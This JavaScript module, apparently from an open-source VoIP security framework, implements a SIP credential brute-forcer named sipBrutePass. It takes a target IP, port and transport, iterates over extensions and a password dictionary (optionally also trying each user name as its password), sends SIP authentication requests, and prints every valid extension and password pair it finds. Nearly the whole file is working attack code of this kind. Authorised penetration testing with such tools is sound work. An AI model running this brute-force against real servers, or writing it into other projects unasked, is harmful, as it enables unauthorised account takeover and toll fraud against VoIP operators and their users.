/*
Copyright Jesus Perez <jesusprubio gmail com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

'use strict';

var async  = require('async'),
    lodash = require('lodash'),

    SipFakeStack = require('../utils/sipFakeStack'),
    sipParser    = require('../utils/sipParser'),
    printer      = require('../utils/printer');


module.exports = (function () {

    return {

        info : {
            name        : 'sipBrutePass',
            description : 'SIP credentials brute-force',
            options     : {
                target : {
                    description  : 'IP address to brute-force',
                    defaultValue : '127.0.0.1',
                    type         : 'targetIp'
                },
                port : {
                    description  : 'Port of the server',
                    defaultValue : 5060,
                    type         : 'port'
                },
                transport : {
                    description  : 'Underlying protocol',
                    defaultValue : 'UDP',
                    type         : 'protocols'
                },
                tlsType : {
                    description  : 'Version of TLS protocol to use (only when TLS)',
                    defaultValue : 'TLSv1',
                    type         : 'tlsType'
                },
                wsPath : {
                    description  : 'Websockets path (only when websockets)',
                    defaultValue : 'ws',
                    type         : 'anyValue'
                },
                extensions : {
                    description  : 'Extension, range (ie: range:0000-0100) or file with them to test',
                    defaultValue : 'file:artifacts/dics/johnPlusNum.txt',
                    type         : 'userPass'
                },
                passwords : {
                    description  : 'Password (or file with them) to test',
                    defaultValue : 'file:artifacts/dics/johnPlusNum.txt',
                    type         : 'userPass'
                },
                userAsPass : {
                    description  : 'Test the same user as password for each one.',
                    defaultValue : 'yes',
                    type         : 'yesNo'
                },
                meth : {
                    description  : 'Type of SIP packets to do the requests',
                    defaultValue : 'REGISTER',
                    type         : 'sipRequests'
                },
                srcHost : {
                    description  : 'Source host to include in the  SIP request ("external" and "random" supported)',
                    defaultValue : 'iface:eth0',
                    type         : 'srcHost'
                },
                srcPort : {
                    description  : 'Source port to include in the  SIP request',
                    defaultValue : 'random',
                    type         : 'portRand'
                },
                domain : {
                    description  : 'Domain to explore ("ip" to use the target)',
                    defaultValue : 'ip',
                    type         : 'domainIp'
                },
                delay : {
                    description  : 'Delay between requests in ms.',
                    defaultValue : 0,
                    type         : 'positiveInt'
                },
                timeout : {
                    description  : 'Time to wait for the first response, in ms.',
                    defaultValue : 5000,
                    type         : 'positiveInt'
                }
            }
        },

        run : function (options, callback) {
            var result         = {
                    valid  : [],
                    errors : []
                },
                indexCountExt  = 0, // Used with delay to know in which index we are
                indexCountPass = 0;

            // We avoid to parallelize here to control the interval of the requests
            async.eachSeries(options.extensions, function (extension, asyncCbExt) {
                var finalPasswords = [];

                finalPasswords = finalPasswords.concat(options.passwords);
                indexCountExt += 1;
                indexCountPass = 0;
                if (options.userAsPass) {
                    finalPasswords.push(extension);
                }

                async.eachSeries(finalPasswords, function (passsword, asyncCbPass) {
                    // We use a new stack in each request to simulate different users
                    var stackConfig = {
                        server    : options.target    || null,
                        port      : options.port      || '5060',
                        transport : options.transport || 'UDP',
                        timeout   : options.timeout   || 10000,
                        wsPath    : options.wsPath    || null,
                        tlsType   : options.tlsType   || 'TLSv1',
                        srcHost   : options.srcHost   || null,
                        lport     : options.srcPort   || null,
                        domain    : options.domain    || null
                    },
                    fakeStack, msgConfig;

                    msgConfig = {
                        meth    : options.meth,
                        fromExt : extension,
                        pass    : passsword
                    };

                    indexCountPass += 1;
                    fakeStack = new SipFakeStack(stackConfig);

                    fakeStack.authenticate(msgConfig, function (err, res) {
                        if (!err) {
                            if (res.valid) {
                                result.valid.push({
                                    extension : extension,
                                    pass      : passsword,
                                    data      : res.data
                                });
                                // We only add valid extensions to final result
                                printer.highlight('Valid credentials found: ' + extension + ' | ' + passsword);
                            } else {
                                // but we print info about tested ones
                                printer.infoHigh('Valid credentials NOT found for: ' + extension + ' | ' + passsword);
                            }
                            // Last element
                            if (indexCountPass === finalPasswords.length &&
                                indexCountExt === options.extensions.length) {
                                asyncCbPass();
                            } else {
                                setTimeout(asyncCbPass, options.delay);
                            }
                        } else {
                            // We don't want to stop the full chain
                            result.errors.push({
                                extension : extension,
                                pass      : passsword,
                                data      : err
                            });
                            asyncCbPass();
                        }
                    });
                }, function (err) {
                    asyncCbExt();
                });
            }, function (err) {
                callback(err, result);
            });
        }
    };

}());
